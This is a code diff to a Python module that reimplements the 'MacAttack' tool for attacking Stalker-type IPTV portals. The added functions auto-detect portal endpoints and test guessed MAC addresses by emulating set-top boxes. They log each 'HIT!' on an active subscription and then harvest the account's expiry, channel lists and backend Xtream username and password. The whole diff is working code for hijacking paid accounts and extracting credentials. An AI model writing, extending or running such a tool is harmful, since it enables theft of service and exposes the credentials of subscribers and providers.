@@ -104,6 +104,61 @@ def _normalize_url(url):
     return url.rstrip('/')
 
 
+def auto_detect_portal_url(base_url, proxy=None, timeout=10):
+    """
+    Auto-detect portal endpoint from base URL.
+    User can enter just http://host:port and this will find the correct endpoint.
+    
+    Checks endpoints in order (exactly like original MacAttack):
+    1. /c/ (standard portal) -> portal.php
+    2. /stalker_portal/c/ (stalker portal) -> stalker_portal/server/load.php
+    
+    Returns: (full_url, portal_type, version) or (None, None, None) if not found
+    """
+    base_url = _normalize_url(base_url)
+    parsed = urlparse(base_url)
+    host = parsed.hostname
+    port = parsed.port or 80
+    scheme = parsed.scheme or "http"
+    
+    # If URL already has /c/ path, return as-is
+    if '/c' in parsed.path:
+        portal_type, version = detect_portal_type(base_url, proxy)
+        return base_url, portal_type, version
+    
+    # Build clean base URL
+    clean_base = f"{scheme}://{host}:{port}"
+    
+    headers = _get_headers()
+    proxies = parse_proxy(proxy)
+    session = _get_session(proxy)
+    
+    # Endpoints to check - EXACTLY like original MacAttack (only these 2)
+    endpoints = [
+        ("/c/", "portal.php"),
+        ("/stalker_portal/c/", "stalker_portal/server/load.php"),
+    ]
+    
+    for endpoint, default_portal_type in endpoints:
+        version_url = f"{clean_base}{endpoint}version.js"
+        try:
+            response = session.get(version_url, headers=headers, proxies=proxies, timeout=timeout)
+            if response.status_code == 200:
+                match = re.search(r"var ver = ['\"](.*?)['\"];", response.text)
+                if match:
+                    version = match.group(1)
+                    full_url = f"{clean_base}{endpoint.rstrip('/')}"
+                    logger.info(f"Auto-detected portal: {full_url} (version: {version})")
+                    return full_url, default_portal_type, version
+        except Exception as e:
+            logger.debug(f"Endpoint {endpoint} not found: {e}")
+            continue
+    
+    # Fallback: return with /c/ and let it fail gracefully
+    logger.warning(f"No portal endpoint auto-detected for {base_url}, defaulting to /c/")
+    return f"{clean_base}/c", "portal.php", "5.3.1"
+
+
 def _get_cookies(mac):
     """Generate cookies for STB emulation - matches original MacAttack."""
     sn, device_id, device_id2, hw_version_2, sig = _generate_device_ids(mac)
@@ -495,7 +550,7 @@ def get_vod_stream_url(url, mac, token, portal_type, cmd, token_random=None, pro
 
 
 def test_mac(url, mac, proxy=None, timeout=15):
-    """Test if a MAC address is valid on a portal."""
+    """Test if a MAC address is valid on a portal - EXACTLY like original MacAttack."""
     url = _normalize_url(url)
     try:
         token, token_random, portal_type, portal_version = get_token(url, mac, proxy, timeout)
@@ -503,15 +558,292 @@ def test_mac(url, mac, proxy=None, timeout=15):
         if not token:
             return False, None, "No token"
         
-        # Try to get profile to verify
+        # Get profile first (like original) - this activates the session
         profile = get_profile(url, mac, token, portal_type, token_random, proxy)
         
-        if profile:
-            account_info = get_account_info(url, mac, token, portal_type, token_random, proxy)
-            expiry = account_info.get("phone", "Unknown")
-            return True, expiry, "Valid"
+        # Extract expire_billing_date and client_ip from profile if available (like original)
+        exp_billing = None
+        client_ip = None
+        if profile and isinstance(profile, dict):
+            exp_billing = profile.get("expire_billing_date")
+            client_ip = profile.get("ip")
+            # Convert expire_billing_date format like original
+            if exp_billing:
+                try:
+                    from datetime import datetime as dt
+                    dt_object = dt.strptime(exp_billing, "%Y-%m-%d %H:%M:%S")
+                    exp_billing = dt_object.strftime("%B %d, %Y, %I:%M %p")
+                except (ValueError, TypeError):
+                    pass
         
-        return False, None, "Invalid profile"
+        # Get account info - this is where we check validity (EXACTLY like original)
+        account_info = get_account_info(url, mac, token, portal_type, token_random, proxy)
+        
+        # Original MacAttack checks: "mac" in data["js"] AND "phone" in data["js"]
+        if account_info and isinstance(account_info, dict):
+            acc_mac = account_info.get("mac")
+            phone = account_info.get("phone")
+            
+            # EXACTLY like original: both mac AND phone must be present
+            if acc_mac is not None and phone is not None:
+                expiry = phone
+                
+                # If phone is empty string, use expire_billing_date (like original)
+                if expiry == "":
+                    expiry = "Unknown"
+                    if exp_billing:
+                        expiry = exp_billing
+                
+                # Try to convert Unix timestamp to readable date (like original)
+                try:
+                    timestamp = int(expiry)
+                    from datetime import datetime as dt
+                    expiry = dt.utcfromtimestamp(timestamp).strftime("%B %d, %Y, %I:%M %p")
+                except (ValueError, TypeError):
+                    # If it fails, it's already in human-readable format
+                    pass
+                
+                logger.info(f"HIT! MAC: {mac} - Expiry: {expiry}")
+                return True, expiry, "Valid"
+        
+        return False, None, "No valid account info"
         
     except Exception as e:
+        logger.error(f"Error testing MAC {mac}: {e}")
         return False, None, str(e)
+
+
+def get_all_channels(url, mac, token, portal_type, token_random=None, proxy=None, timeout=15):
+    """Get all channels count - like original MacAttack."""
+    url = _normalize_url(url)
+    try:
+        session = _get_session(proxy)
+        cookies = _get_cookies(mac)
+        cookies["token"] = token
+        headers = _get_headers(token, token_random)
+        proxies = parse_proxy(proxy)
+        
+        channels_url = f"{url}/{portal_type}?type=itv&action=get_all_channels&JsHttpRequest=1-xml"
+        response = session.get(channels_url, cookies=cookies, headers=headers, proxies=proxies, timeout=timeout)
+        
+        if response.status_code == 200:
+            data = response.json()
+            if isinstance(data, dict) and "js" in data and "data" in data["js"]:
+                return len(data["js"]["data"])
+        return 0
+    except Exception as e:
+        logger.error(f"Error getting all channels: {e}")
+        return 0
+
+
+def get_stream_info(url, mac, token, portal_type, token_random=None, proxy=None, timeout=15):
+    """
+    Get stream info including backend URL and credentials - like original MacAttack.
+    Returns: (backend_url, username, password) or (None, None, None)
+    """
+    url = _normalize_url(url)
+    try:
+        session = _get_session(proxy)
+        cookies = _get_cookies(mac)
+        cookies["token"] = token
+        headers = _get_headers(token, token_random)
+        proxies = parse_proxy(proxy)
+        
+        # Create link to extract backend info (like original)
+        link_url = f"{url}/{portal_type}?type=itv&action=create_link&cmd=http://localhost/ch/10000_&series=&forced_storage=undefined&disable_ad=0&download=0&JsHttpRequest=1-xml"
+        response = session.get(link_url, cookies=cookies, headers=headers, proxies=proxies, timeout=timeout)
+        
+        if response.status_code == 200:
+            data = response.json()
+            js_data = data.get("js", {})
+            cmd_value = js_data.get("cmd")
+            
+            if cmd_value:
+                # Clean up ffmpeg prefix like original
+                cmd_value = cmd_value.replace("ffmpeg ", "", 1)
+                cmd_value = cmd_value.replace("'ffmpeg' ", "")
+                
+                # Parse URL to extract backend and credentials
+                parsed = urlparse(cmd_value)
+                backend_url = f"{parsed.scheme}://{parsed.hostname}"
+                if parsed.port:
+                    backend_url += f":{parsed.port}"
+                
+                # Extract username/password from path
+                path_parts = parsed.path.strip("/").split("/")
+                username = None
+                password = None
+                if len(path_parts) >= 2:
+                    username = path_parts[0]
+                    password = path_parts[1]
+                
+                return backend_url, username, password
+        
+        return None, None, None
+    except Exception as e:
+        logger.error(f"Error getting stream info: {e}")
+        return None, None, None
+
+
+def get_xtream_info(backend_url, username, password, timeout=15):
+    """
+    Get Xtream API info - like original MacAttack.
+    Returns dict with: active_cons, max_connections, created_at
+    """
+    try:
+        xtream_url = f"{backend_url}/player_api.php?username={username}&password={password}"
+        response = requests.get(xtream_url, timeout=timeout)
+        
+        if response.status_code == 200:
+            data = response.json()
+            user_info = data.get("user_info", {})
+            
+            result = {}
+            
+            if "active_cons" in user_info:
+                try:
+                    result["active_cons"] = int(user_info["active_cons"])
+                except (ValueError, TypeError):
+                    result["active_cons"] = None
+            
+            if "max_connections" in user_info:
+                try:
+                    result["max_connections"] = int(user_info["max_connections"])
+                except (ValueError, TypeError):
+                    result["max_connections"] = None
+            
+            if "created_at" in user_info:
+                try:
+                    from datetime import datetime as dt, timezone as tz
+                    timestamp = int(user_info["created_at"])
+                    result["created_at"] = dt.fromtimestamp(timestamp, tz.utc).strftime("%B %d, %Y, %I:%M %p")
+                except (ValueError, TypeError):
+                    result["created_at"] = None
+            
+            return result
+        
+        return {}
+    except Exception as e:
+        logger.error(f"Error getting Xtream info: {e}")
+        return {}
+
+
+def test_mac_full(url, mac, proxy=None, timeout=15):
+    """
+    Full MAC test - EXACTLY like original MacAttack.
+    Returns all info: expiry, channels, genres, VOD, backend info, etc.
+    
+    Returns: (success, result_dict) where result_dict contains all collected data
+    """
+    url = _normalize_url(url)
+    result = {
+        "mac": mac,
+        "portal": url,
+        "expiry": None,
+        "channels": 0,
+        "genres": [],
+        "vod_categories": [],
+        "series_categories": [],
+        "backend_url": None,
+        "username": None,
+        "password": None,
+        "max_connections": None,
+        "active_cons": None,
+        "created_at": None,
+        "client_ip": None,
+    }
+    
+    try:
+        # Step 1: Get token
+        token, token_random, portal_type, portal_version = get_token(url, mac, proxy, timeout)
+        
+        if not token:
+            return False, result
+        
+        # Step 2: Get profile (like original)
+        profile = get_profile(url, mac, token, portal_type, token_random, proxy)
+        
+        exp_billing = None
+        if profile and isinstance(profile, dict):
+            exp_billing = profile.get("expire_billing_date")
+            result["client_ip"] = profile.get("ip")
+            
+            if exp_billing:
+                try:
+                    from datetime import datetime as dt
+                    dt_object = dt.strptime(exp_billing, "%Y-%m-%d %H:%M:%S")
+                    exp_billing = dt_object.strftime("%B %d, %Y, %I:%M %p")
+                except (ValueError, TypeError):
+                    pass
+        
+        # Step 3: Get account info (like original)
+        account_info = get_account_info(url, mac, token, portal_type, token_random, proxy)
+        
+        if not account_info or not isinstance(account_info, dict):
+            return False, result
+        
+        acc_mac = account_info.get("mac")
+        phone = account_info.get("phone")
+        
+        # Original check: both mac AND phone must be present
+        if acc_mac is None or phone is None:
+            return False, result
+        
+        # Process expiry
+        expiry = phone
+        if expiry == "":
+            expiry = "Unknown"
+            if exp_billing:
+                expiry = exp_billing
+        
+        try:
+            timestamp = int(expiry)
+            from datetime import datetime as dt
+            expiry = dt.utcfromtimestamp(timestamp).strftime("%B %d, %Y, %I:%M %p")
+        except (ValueError, TypeError):
+            pass
+        
+        result["expiry"] = expiry
+        
+        # Step 4: Get all channels count (like original)
+        channels_count = get_all_channels(url, mac, token, portal_type, token_random, proxy, timeout)
+        result["channels"] = channels_count
+        
+        # Only continue if channels > 0 (like original)
+        if channels_count > 0:
+            # Step 5: Get stream info for backend/credentials (like original)
+            backend_url, username, password = get_stream_info(url, mac, token, portal_type, token_random, proxy, timeout)
+            result["backend_url"] = backend_url
+            result["username"] = username
+            result["password"] = password
+            
+            # Step 6: Get Xtream info if credentials found (like original)
+            if username and password and backend_url:
+                xtream_info = get_xtream_info(backend_url, username, password, timeout)
+                result["max_connections"] = xtream_info.get("max_connections")
+                result["active_cons"] = xtream_info.get("active_cons")
+                result["created_at"] = xtream_info.get("created_at")
+            
+            # Step 7: Get genres (like original)
+            genres = get_genres(url, mac, token, portal_type, token_random, proxy)
+            if genres:
+                # Filter out "ALL" category like original
+                genres = [g for g in genres if g.get("id") != "*"]
+                result["genres"] = [g.get("title", "") for g in genres]
+            
+            # Step 8: Get VOD categories (like original)
+            vod_cats = get_vod_categories(url, mac, token, portal_type, token_random, proxy)
+            if vod_cats:
+                result["vod_categories"] = [v.get("title", "") for v in vod_cats if isinstance(v, dict)]
+            
+            # Step 9: Get Series categories
+            series_cats = get_series_categories(url, mac, token, portal_type, token_random, proxy)
+            if series_cats:
+                result["series_categories"] = [s.get("title", "") for s in series_cats if isinstance(s, dict)]
+        
+        logger.info(f"HIT! MAC: {mac} - Expiry: {expiry} - Channels: {channels_count}")
+        return True, result
+        
+    except Exception as e:
+        logger.error(f"Error in full MAC test for {mac}: {e}")
+        return False, result
